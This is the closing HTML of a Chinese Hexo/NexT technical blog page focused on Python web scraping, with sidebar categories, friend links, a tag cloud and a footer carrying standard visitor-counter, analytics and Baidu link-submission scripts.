            <div class="sidebar-panel sidebar-panel-categories sidebar-panel-active">
              <h4 class="name"> 分类 </h4>
              <div class="content">
                <ul class="category-list">
                  <li class="category-list-item"><a class="category-list-link" href="/categories/API/">API</a><span class="category-list-count">5</span></li>
                  <li class="category-list-item"><a class="category-list-link" href="/categories/C-C/">C/C++</a><span class="category-list-count">23</span></li>
                  <li class="category-list-item"><a class="category-list-link" href="/categories/HTML/">HTML</a><span class="category-list-count">14</span></li>
                  <li class="category-list-item"><a class="category-list-link" href="/categories/Java/">Java</a><span class="category-list-count">5</span></li>
                  <li class="category-list-item"><a class="category-list-link" href="/categories/JavaScript/">JavaScript</a><span class="category-list-count">26</span></li>
                  <li class="category-list-item"><a class="category-list-link" href="/categories/Linux/">Linux</a><span class="category-list-count">14</span></li>
                  <li class="category-list-item"><a class="category-list-link" href="/categories/Luma/">Luma</a><span class="category-list-count">1</span></li>
                  <li class="category-list-item"><a class="category-list-link" href="/categories/Markdown/">Markdown</a><span class="category-list-count">2</span></li>
                  <li class="category-list-item"><a class="category-list-link" href="/categories/Net/">Net</a><span class="category-list-count">4</span></li>
                  <li class="category-list-item"><a class="category-list-link" href="/categories/Nexior/">Nexior</a><span class="category-list-count">1</span></li>
                  <li class="category-list-item"><a class="category-list-link" href="/categories/Other/">Other</a><span class="category-list-count">40</span></li>
                  <li class="category-list-item"><a class="category-list-link" href="/categories/PHP/">PHP</a><span class="category-list-count">27</span></li>
                  <li class="category-list-item"><a class="category-list-link" href="/categories/Paper/">Paper</a><span class="category-list-count">2</span></li>
                  <li class="category-list-item"><a class="category-list-link" href="/categories/Python/">Python</a><span class="category-list-count">303</span></li>
                  <li class="category-list-item"><a class="category-list-link" href="/categories/TypeScript/">TypeScript</a><span class="category-list-count">2</span></li>
                  <li class="category-list-item"><a class="category-list-link" href="/categories/%E4%B8%AA%E4%BA%BA%E5%B1%95%E7%A4%BA/">个人展示</a><span class="category-list-count">1</span></li>
                  <li class="category-list-item"><a class="category-list-link" href="/categories/%E4%B8%AA%E4%BA%BA%E6%97%A5%E8%AE%B0/">个人日记</a><span class="category-list-count">9</span></li>
                  <li class="category-list-item"><a class="category-list-link" href="/categories/%E4%B8%AA%E4%BA%BA%E8%AE%B0%E5%BD%95/">个人记录</a><span class="category-list-count">6</span></li>
                  <li class="category-list-item"><a class="category-list-link" href="/categories/%E4%B8%AA%E4%BA%BA%E9%9A%8F%E7%AC%94/">个人随笔</a><span class="category-list-count">21</span></li>
                  <li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/">人工智能</a><span class="category-list-count">5</span></li>
                  <li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/">安装配置</a><span class="category-list-count">59</span></li>
                  <li class="category-list-item"><a class="category-list-link" href="/categories/%E6%8A%80%E6%9C%AF%E6%9D%82%E8%B0%88/">技术杂谈</a><span class="category-list-count">96</span></li>
                  <li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9C%AA%E5%88%86%E7%B1%BB/">未分类</a><span class="category-list-count">1</span></li>
                  <li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/">深度学习</a><span class="category-list-count">1</span></li>
                  <li class="category-list-item"><a class="category-list-link" href="/categories/%E7%88%AC%E8%99%AB/">爬虫</a><span class="category-list-count">4</span></li>
                  <li class="category-list-item"><a class="category-list-link" href="/categories/%E7%94%9F%E6%B4%BB%E7%AC%94%E8%AE%B0/">生活笔记</a><span class="category-list-count">1</span></li>
                  <li class="category-list-item"><a class="category-list-link" href="/categories/%E7%A6%8F%E5%88%A9%E4%B8%93%E5%8C%BA/">福利专区</a><span class="category-list-count">6</span></li>
                  <li class="category-list-item"><a class="category-list-link" href="/categories/%E8%81%8C%E4%BD%8D%E6%8E%A8%E8%8D%90/">职位推荐</a><span class="category-list-count">1</span></li>
                  <li class="category-list-item"><a class="category-list-link" href="/categories/%E8%89%BA%E6%9C%AF%E4%BA%8C%E7%BB%B4%E7%A0%81/">艺术二维码</a><span class="category-list-count">1</span></li>
                </ul>
              </div>
            </div>
            <div class="sidebar-panel sidebar-panel-friends sidebar-panel-active">
              <h4 class="name"> 友情链接 </h4>
              <ul class="friends">
                <li class="friend">
                  <span class="logo">
                    <img src="https://cdn.cuiqingcai.com/j2dub.jpg">
                  </span>
                  <span class="link">
                    <a href="https://www.findhao.net/" target="_blank" rel="noopener">FindHao</a>
                  </span>
                </li>
                <li class="friend">
                  <span class="logo">
                    <img src="https://cdn.cuiqingcai.com/6apxu.jpg">
                  </span>
                  <span class="link">
                    <a href="https://www.51dev.com/" target="_blank" rel="noopener">IT技术社区</a>
                  </span>
                </li>
                <li class="friend">
                  <span class="logo">
                    <img src="https://cdn.cuiqingcai.com/bqlbs.png">
                  </span>
                  <span class="link">
                    <a href="http://www.urselect.com/" target="_blank" rel="noopener">优社电商</a>
                  </span>
                </li>
                <li class="friend">
                  <span class="logo">
                    <img src="https://cdn.cuiqingcai.com/8s88c.jpg">
                  </span>
                  <span class="link">
                    <a href="https://www.yuanrenxue.com/" target="_blank" rel="noopener">猿人学</a>
                  </span>
                </li>
                <li class="friend">
                  <span class="logo">
                    <img src="https://cdn.cuiqingcai.com/2wgg5.jpg">
                  </span>
                  <span class="link">
                    <a href="https://www.yunlifang.cn/" target="_blank" rel="noopener">云立方</a>
                  </span>
                </li>
                <li class="friend">
                  <span class="logo">
                    <img src="http://qianxunclub.com/favicon.png">
                  </span>
                  <span class="link">
                    <a href="http://qianxunclub.com/" target="_blank" rel="noopener">千寻啊千寻</a>
                  </span>
                </li>
                <li class="friend">
                  <span class="logo">
                    <img src="https://cdn.cuiqingcai.com/0044u.jpg">
                  </span>
                  <span class="link">
                    <a href="http://kodcloud.com/" target="_blank" rel="noopener">可道云</a>
                  </span>
                </li>
                <li class="friend">
                  <span class="logo">
                    <img src="https://cdn.cuiqingcai.com/ygnpn.jpg">
                  </span>
                  <span class="link">
                    <a href="http://www.kunkundashen.cn/" target="_blank" rel="noopener">坤坤大神</a>
                  </span>
                </li>
                <li class="friend">
                  <span class="logo">
                    <img src="https://cdn.cuiqingcai.com/x714o.jpg">
                  </span>
                  <span class="link">
                    <a href="http://www.hubwiz.com/" target="_blank" rel="noopener">汇智网</a>
                  </span>
                </li>
                <li class="friend">
                  <span class="logo">
                    <img src="https://cdn.cuiqingcai.com/44hxf.png">
                  </span>
                  <span class="link">
                    <a href="http://redstonewill.com/" target="_blank" rel="noopener">红色石头</a>
                  </span>
                </li>
                <li class="friend">
                  <span class="logo">
                    <img src="https://cdn.cuiqingcai.com/wkaus.jpg">
                  </span>
                  <span class="link">
                    <a href="https://zhaoshuai.me/" target="_blank" rel="noopener">碎念</a>
                  </span>
                </li>
                <li class="friend">
                  <span class="logo">
                    <img src="https://cdn.cuiqingcai.com/pgo0r.jpg">
                  </span>
                  <span class="link">
                    <a href="https://www.chenwenguan.com/" target="_blank" rel="noopener">陈文管的博客</a>
                  </span>
                </li>
                <li class="friend">
                  <span class="logo">
                    <img src="https://cdn.cuiqingcai.com/kk82a.jpg">
                  </span>
                  <span class="link">
                    <a href="https://www.lxlinux.net/" target="_blank" rel="noopener">良许Linux教程网</a>
                  </span>
                </li>
                <li class="friend">
                  <span class="logo">
                    <img src="https://cdn.cuiqingcai.com/lj0t2.jpg">
                  </span>
                  <span class="link">
                    <a href="https://tanqingbo.cn/" target="_blank" rel="noopener">IT码农</a>
                  </span>
                </li>
                <li class="friend">
                  <span class="logo">
                    <img src="https://cdn.cuiqingcai.com/i8cdr.png">
                  </span>
                  <span class="link">
                    <a href="https://junyiseo.com/" target="_blank" rel="noopener">均益个人博客</a>
                  </span>
                </li>
                <li class="friend">
                  <span class="logo">
                    <img src="https://cdn.cuiqingcai.com/chwv2.png">
                  </span>
                  <span class="link">
                    <a href="https://brucedone.com/" target="_blank" rel="noopener">大鱼的鱼塘</a>
                  </span>
                </li>
                <li class="friend">
                  <span class="logo">
                    <img src="https://www.91vps.com/favicon.ico">
                  </span>
                  <span class="link">
                    <a href="http://www.91vps.com/" target="_blank" rel="noopener">91VPS</a>
                  </span>
                </li>
                <li class="friend">
                  <span class="logo">
                    <img src="https://webpage.qidian.qq.com/qidian/chatv3-gray/favicon.ico">
                  </span>
                  <span class="link">
                    <a href="https://www.qg.net/" target="_blank" rel="noopener">青果网络</a>
                  </span>
                </li>
              </ul>
            </div>
            <div class="sidebar-panel sidebar-panel-tags sidebar-panel-active">
              <h4 class="name"> 标签云 </h4>
              <div class="content">
                <a href="/tags/2022/" style="font-size: 20px;">2022</a> <a href="/tags/2048/" style="font-size: 10px;">2048</a> <a href="/tags/ADSL/" style="font-size: 10px;">ADSL</a> <a href="/tags/API/" style="font-size: 16px;">API</a> <a href="/tags/Ajax/" style="font-size: 12px;">Ajax</a> <a href="/tags/Bootstrap/" style="font-size: 11px;">Bootstrap</a> <a href="/tags/Bug/" style="font-size: 10px;">Bug</a> <a href="/tags/CDN/" style="font-size: 10px;">CDN</a> <a href="/tags/CQC/" style="font-size: 10px;">CQC</a> <a href="/tags/CSS/" style="font-size: 10px;">CSS</a> <a href="/tags/CSS-%E5%8F%8D%E7%88%AC%E8%99%AB/" style="font-size: 10px;">CSS 反爬虫</a> <a href="/tags/CV/" style="font-size: 10px;">CV</a> <a href="/tags/ChatGPT/" style="font-size: 10px;">ChatGPT</a> <a href="/tags/Cookie/" style="font-size: 10px;">Cookie</a> <a href="/tags/Django/" style="font-size: 10px;">Django</a> <a href="/tags/Eclipse/" style="font-size: 11px;">Eclipse</a> <a href="/tags/Elasticsearch/" style="font-size: 10px;">Elasticsearch</a> <a href="/tags/FTP/" style="font-size: 10px;">FTP</a> <a href="/tags/Flux/" style="font-size: 10px;">Flux</a> <a href="/tags/Git/" style="font-size: 10px;">Git</a> <a href="/tags/GitHub/" style="font-size: 13px;">GitHub</a> <a href="/tags/HTML5/" style="font-size: 10px;">HTML5</a> <a href="/tags/HTTP/" style="font-size: 10px;">HTTP</a> <a href="/tags/Hailuo/" style="font-size: 10px;">Hailuo</a> <a href="/tags/Hexo/" style="font-size: 10px;">Hexo</a> <a href="/tags/Hook/" style="font-size: 10px;">Hook</a> <a href="/tags/IP/" style="font-size: 10px;">IP</a> <a href="/tags/IT/" style="font-size: 10px;">IT</a> <a href="/tags/JSON/" style="font-size: 10px;">JSON</a> <a href="/tags/JSP/" style="font-size: 10px;">JSP</a> <a href="/tags/JavaScript/" style="font-size: 14px;">JavaScript</a> <a href="/tags/K8s/" style="font-size: 10px;">K8s</a> <a href="/tags/LOGO/" style="font-size: 10px;">LOGO</a> <a href="/tags/Linux/" style="font-size: 10px;">Linux</a> <a href="/tags/Luma/" style="font-size: 10px;">Luma</a> <a href="/tags/MIUI/" style="font-size: 10px;">MIUI</a> <a href="/tags/Markdown/" style="font-size: 10px;">Markdown</a> <a href="/tags/Midjourney/" style="font-size: 11px;">Midjourney</a> <a href="/tags/MongoDB/" style="font-size: 11px;">MongoDB</a> <a href="/tags/MySQL/" style="font-size: 10px;">MySQL</a> <a href="/tags/Mysql/" style="font-size: 10px;">Mysql</a> <a href="/tags/NBA/" style="font-size: 10px;">NBA</a> <a href="/tags/Nexior/" style="font-size: 10px;">Nexior</a> <a href="/tags/OCR/" style="font-size: 10px;">OCR</a> <a href="/tags/OpenCV/" style="font-size: 10px;">OpenCV</a> <a href="/tags/PHP/" style="font-size: 11px;">PHP</a> <a href="/tags/PPT/" style="font-size: 10px;">PPT</a> <a href="/tags/PS/" style="font-size: 10px;">PS</a> <a href="/tags/Pathlib/" style="font-size: 10px;">Pathlib</a> <a href="/tags/PhantomJS/" style="font-size: 10px;">PhantomJS</a> <a href="/tags/Playwright/" style="font-size: 10px;">Playwright</a> <a href="/tags/Python/" style="font-size: 17px;">Python</a> <a href="/tags/Python-%E7%88%AC%E8%99%AB/" style="font-size: 18px;">Python 爬虫</a> <a href="/tags/Python3/" style="font-size: 11px;">Python3</a> <a href="/tags/Python3%E7%88%AC%E8%99%AB%E6%95%99%E7%A8%8B/" style="font-size: 12px;">Python3爬虫教程</a> <a href="/tags/Pythonic/" style="font-size: 10px;">Pythonic</a> <a href="/tags/Python%E7%88%AC%E8%99%AB/" style="font-size: 19px;">Python爬虫</a> <a href="/tags/Python%E7%88%AC%E8%99%AB%E4%B9%A6/" style="font-size: 12px;">Python爬虫书</a> <a href="/tags/Python%E7%88%AC%E8%99%AB%E6%95%99%E7%A8%8B/" style="font-size: 15px;">Python爬虫教程</a> <a href="/tags/QQ/" style="font-size: 10px;">QQ</a> <a href="/tags/RabbitMQ/" style="font-size: 10px;">RabbitMQ</a> <a href="/tags/ReCAPTCHA/" style="font-size: 10px;">ReCAPTCHA</a> <a href="/tags/Redis/" style="font-size: 10px;">Redis</a> <a href="/tags/Riffusion/" style="font-size: 10px;">Riffusion</a> <a href="/tags/SAE/" style="font-size: 10px;">SAE</a> <a href="/tags/SSH/" style="font-size: 10px;">SSH</a> <a href="/tags/SVG/" style="font-size: 10px;">SVG</a> <a href="/tags/Scrapy-redis/" style="font-size: 10px;">Scrapy-redis</a> <a href="/tags/Scrapy%E5%88%86%E5%B8%83%E5%BC%8F/" style="font-size: 10px;">Scrapy分布式</a> <a href="/tags/Selenium/" style="font-size: 11px;">Selenium</a> <a href="/tags/Session/" style="font-size: 10px;">Session</a> <a href="/tags/Shell/" style="font-size: 10px;">Shell</a> <a href="/tags/Suno/" style="font-size: 10px;">Suno</a> <a href="/tags/TKE/" style="font-size: 10px;">TKE</a> <a href="/tags/TXT/" style="font-size: 10px;">TXT</a> <a href="/tags/Terminal/" style="font-size: 10px;">Terminal</a> <a href="/tags/Ubuntu/" style="font-size: 11px;">Ubuntu</a> <a href="/tags/VS-Code/" style="font-size: 10px;">VS Code</a> <a href="/tags/Veo/" style="font-size: 10px;">Veo</a> <a href="/tags/Vercel/" style="font-size: 10px;">Vercel</a> <a href="/tags/Vs-Code/" style="font-size: 10px;">Vs Code</a> <a href="/tags/Vue/" style="font-size: 11px;">Vue</a> <a href="/tags/Web/" style="font-size: 10px;">Web</a> <a href="/tags/Webpack/" style="font-size: 10px;">Webpack</a> <a href="/tags/Web%E7%BD%91%E9%A1%B5/" style="font-size: 10px;">Web网页</a> <a href="/tags/Windows/" style="font-size: 10px;">Windows</a> <a href="/tags/Winpcap/" style="font-size: 10px;">Winpcap</a> <a href="/tags/WordPress/" style="font-size: 13px;">WordPress</a> <a href="/tags/XPath/" style="font-size: 12px;">XPath</a> <a href="/tags/Youtube/" style="font-size: 11px;">Youtube</a> <a href="/tags/acedata/" style="font-size: 12px;">acedata</a> <a href="/tags/aiohttp/" style="font-size: 10px;">aiohttp</a> <a href="/tags/android/" style="font-size: 10px;">android</a> <a href="/tags/ansible/" style="font-size: 10px;">ansible</a> <a href="/tags/api/" style="font-size: 13px;">api</a> <a href="/tags/chatgpt/" style="font-size: 10px;">chatgpt</a> <a href="/tags/cocos2d-x/" style="font-size: 10px;">cocos2d-x</a> <a href="/tags/dummy-change/" style="font-size: 10px;">dummy change</a> <a href="/tags/e6/" style="font-size: 10px;">e6</a> <a href="/tags/fitvids/" style="font-size: 10px;">fitvids</a>
              </div>
              <script>
                const tagsColors = ['#00a67c', '#5cb85c', '#d9534f', '#567e95', '#b37333', '#f4843d', '#15a287']
                const tagsElements = document.querySelectorAll('.sidebar-panel-tags .content a')
                tagsElements.forEach((item) =>
                {
                  item.style.backgroundColor = tagsColors[Math.floor(Math.random() * tagsColors.length)]
                })

              </script>
            </div>
          </div>
        </aside>
        <div id="sidebar-dimmer"></div>
      </div>
    </main>
    <footer class="footer">
      <div class="footer-inner">
        <div class="copyright">
          <span class="author" itemprop="copyrightHolder">崔庆才丨静觅</span> &copy; <span itemprop="copyrightYear">2025</span>
          <span class="with-love">
            <i class="fa fa-heart"></i>
          </span>
          <a href="https://cuiqingcai.com/sitemap.xml" style="display:none" title="爬虫教程" target="_blank"><strong>爬虫教程</strong></a>
          <a href="https://cuiqingcai.com/sitemap.html" style="display:none" title="爬虫教程" target="_blank"><strong>爬虫教程</strong></a>
          <span class="post-meta-divider">|</span>
          <span class="post-meta-item-icon">
            <i class="fa fa-chart-area"></i>
          </span>
          <span title="站点总字数">3.3m</span>
          <span class="post-meta-divider">|</span>
          <span class="post-meta-item-icon">
            <i class="fa fa-coffee"></i>
          </span>
          <span title="站点阅读时长">49:35</span>
        </div>
        <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动 </div>
        <div class="beian"><a href="https://beian.miit.gov.cn/" rel="noopener" target="_blank">京ICP备18015597号-1 </a>
        </div>
        <script>
          (function ()
          {
            function leancloudSelector(url)
            {
              url = encodeURI(url);
              return document.getElementById(url).querySelector('.leancloud-visitors-count');
            }

            function addCount(Counter)
            {
              var visitors = document.querySelector('.leancloud_visitors');
              var url = decodeURI(visitors.id);
              var title = visitors.dataset.flagTitle;
              Counter('get', '/classes/Counter?where=' + encodeURIComponent(JSON.stringify(
              {
                url
              }))).then(response => response.json()).then((
              {
                results
              }) =>
              {
                if (results.length > 0)
                {
                  var counter = results[0];
                  leancloudSelector(url).innerText = counter.time + 1;
                  Counter('put', '/classes/Counter/' + counter.objectId,
                  {
                    time:
                    {
                      '__op': 'Increment',
                      'amount': 1
                    }
                  }).catch(error =>
                  {
                    console.error('Failed to save visitor count', error);
                  });
                }
                else
                {
                  Counter('post', '/classes/Counter',
                  {
                    title,
                    url,
                    time: 1
                  }).then(response => response.json()).then(() =>
                  {
                    leancloudSelector(url).innerText = 1;
                  }).catch(error =>
                  {
                    console.error('Failed to create', error);
                  });
                }
              }).catch(error =>
              {
                console.error('LeanCloud Counter Error', error);
              });
            }

            function showTime(Counter)
            {
              var visitors = document.querySelectorAll('.leancloud_visitors');
              var entries = [...visitors].map(element =>
              {
                return decodeURI(element.id);
              });
              Counter('get', '/classes/Counter?where=' + encodeURIComponent(JSON.stringify(
              {
                url:
                {
                  '$in': entries
                }
              }))).then(response => response.json()).then((
              {
                results
              }) =>
              {
                for (let url of entries)
                {
                  let target = results.find(item => item.url === url);
                  leancloudSelector(url).innerText = target ? target.time : 0;
                }
              }).catch(error =>
              {
                console.error('LeanCloud Counter Error', error);
              });
            }
            let
            {
              app_id,
              app_key,
              server_url
            } = {
              "enable": true,
              "app_id": "6X5dRQ0pnPWJgYy8SXOg0uID-gzGzoHsz",
              "app_key": "ziLDVEy73ne5HtFTiGstzHMS",
              "server_url": "https://6x5drq0p.lc-cn-n1-shared.com",
              "security": false
            };

            function fetchData(api_server)
            {
              var Counter = (method, url, data) =>
              {
                return fetch(`${api_server}/1.1${url}`,
                {
                  method,
                  headers:
                  {
                    'X-LC-Id': app_id,
                    'X-LC-Key': app_key,
                    'Content-Type': 'application/json',
                  },
                  body: JSON.stringify(data)
                });
              };
              if (CONFIG.page.isPost)
              {
                if (CONFIG.hostname !== location.hostname) return;
                addCount(Counter);
              }
              else if (document.querySelectorAll('.post-title-link').length >= 1)
              {
                showTime(Counter);
              }
            }
            let api_server = app_id.slice(-9) !== '-MdYXbMMI' ? server_url : `https://${app_id.slice(0, 8).toLowerCase()}.api.lncldglobal.com`;
            if (api_server)
            {
              fetchData(api_server);
            }
            else
            {
              fetch('https://app-router.leancloud.cn/2/route?appId=' + app_id).then(response => response.json()).then((
              {
                api_server
              }) =>
              {
                fetchData('https://' + api_server);
              });
            }
          })();

        </script>
      </div>
      <div class="footer-stat">
        <span id="cnzz_stat_icon_1279355174"></span>
        <script type="text/javascript">
          document.write(unescape("%3Cspan id='cnzz_stat_icon_1279355174'%3E%3C/span%3E%3Cscript src='https://v1.cnzz.com/z_stat.php%3Fid%3D1279355174%26online%3D1%26show%3Dline' type='text/javascript'%3E%3C/script%3E"));

        </script>
      </div>
    </footer>
  </div>
  <script src="//cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/pangu@4/dist/browser/pangu.min.js"></script>
  <script src="/js/utils.js"></script>
  <script src="/.js"></script>
  <script src="/js/schemes/pisces.js"></script>
  <script src="/.js"></script>
  <script src="/js/next-boot.js"></script>
  <script src="/.js"></script>
  <script>
    (function ()
    {
      var canonicalURL, curProtocol;
      //Get the <link> tag
      var x = document.getElementsByTagName("link");
      //Find the last canonical URL
      if (x.length > 0)
      {
        for (i = 0; i < x.length; i++)
        {
          if (x[i].rel.toLowerCase() == 'canonical' && x[i].href)
          {
            canonicalURL = x[i].href;
          }
        }
      }
      //Get protocol
      if (!canonicalURL)
      {
        curProtocol = window.location.protocol.split(':')[0];
      }
      else
      {
        curProtocol = canonicalURL.split(':')[0];
      }
      //Get current URL if the canonical URL does not exist
      if (!canonicalURL) canonicalURL = window.location.href;
      //Assign script content. Replace current URL with the canonical URL
      ! function ()
      {
        var e = /([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,
          r = canonicalURL,
          t = document.referrer;
        if (!e.test(r))
        {
          var n = (String(curProtocol).toLowerCase() === 'https') ? "https://sp0.baidu.com/9_Q4simg2RQJ8t7jm9iCKT-xh_/s.gif" : "//api.share.baidu.com/s.gif";
          t ? (n += "?r=" + encodeURIComponent(document.referrer), r && (n += "&l=" + r)) : r && (n += "?l=" + r);
          var i = new Image;
          i.src = n
        }
      }(window);
    })();

  </script>
  <script src="/js/local-search.js"></script>
  <script src="/.js"></script>
</body>

</html>
